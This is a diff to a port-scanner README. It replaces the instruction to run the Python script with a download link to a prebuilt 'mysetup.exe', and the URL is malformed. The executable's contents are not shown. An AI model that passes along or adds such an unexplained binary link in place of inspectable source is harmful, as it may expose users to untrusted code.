@@ -30,9 +30,8 @@ Install requirements:
 
 pip install -r requirements.txt
 
-🚀 Usage
-python tcp_port_scanner_gui.py
-
+🚀Download Link
+https://github.com/<Abiha0421/Port-Scanner/releases/download/v1.0/mysetup.exe
 
 Enter target IP/hostname and port range.
 
@@ -43,3 +42,5 @@ View results in real time.
 Export or save report as needed.
 
 👉 This repo is intended for educational and penetration testing lab purposes only. Do not use it against systems without explicit authorization.
+
+
